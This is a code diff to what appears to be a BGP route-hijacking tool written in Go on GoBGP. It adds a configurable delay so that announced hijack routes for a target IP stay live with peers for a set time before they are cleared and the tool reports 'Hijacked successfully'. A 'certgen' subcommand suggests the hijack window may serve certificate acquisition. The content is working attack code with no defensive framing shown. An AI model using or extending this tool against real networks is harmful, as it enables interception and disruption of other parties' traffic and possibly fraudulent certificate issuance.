@@ -10,6 +10,7 @@ import (
 	"strconv"
 	"strings"
 	"net"
+	"time"
 
 	api "github.com/osrg/gobgp/v3/api"
 	"google.golang.org/grpc"
@@ -35,6 +36,7 @@ type Community struct {
 
 type Config struct {
 	Community string `json:"community"`
+	Time      int    `json:"time"` // Time in seconds to wait after hijacking
 }
 
 type RipeRpkiResponse struct {
@@ -395,11 +397,13 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			peer.Peer.Conf.PeerAsn,
 			peer.Peer.State.SessionState)
 
+		np, err := normalizePrefix(fmt.Sprintf("%s/%d", ip, prefixLen))
+		if err != nil {
+			log.Fatal(err)
+		}
+
 		if dryrun {
-			np, err := normalizePrefix(fmt.Sprintf("%s/%d", ip, prefixLen))
-			if err != nil {
-				log.Fatal(err)
-			}
+			
 			fmt.Printf("[DRYRUN] Would add route %s with origin %d\n", 
 				np, asn)
 			continue
@@ -411,9 +415,23 @@ func hijackRoutes(client api.GobgpApiClient, ctx context.Context, ip string, dry
 			return fmt.Errorf("failed to add route to %s: %v", peer.Peer.Conf.NeighborAddress, err)
 		}
 
-		fmt.Printf("Route added successfully to %s (prefix length: /%d)\n", 
-			peer.Peer.Conf.NeighborAddress, prefixLen)
+		fmt.Printf("Route added successfully to %s (%s)\n", 
+			peer.Peer.Conf.NeighborAddress, np)
 	}
+
+	// Wait for the configured time if not in dryrun mode
+	if !dryrun && config.Time > 0 {
+		fmt.Printf("[INFO] Waiting for %d seconds...\n", config.Time)
+		time.Sleep(time.Duration(config.Time) * time.Second)
+		fmt.Println("[INFO] Wait completed")
+	}
+
+	// Clear routes
+	if err := clearRoutes(client, ctx); err != nil {
+		return fmt.Errorf("failed to clear routes: %v", err)
+	}
+	fmt.Println("Hijacked successfully")
+
 	return nil
 }
 
@@ -497,6 +515,7 @@ func main() {
 		if err := hijackRoutes(client, ctx, targetIP, dryrun); err != nil {
 			log.Fatalf("Failed to hijack routes: %v", err)
 		}
+		//TODO: wait for config.Time seconds
 
 	case "certgen":
 		if len(os.Args) < 3 {
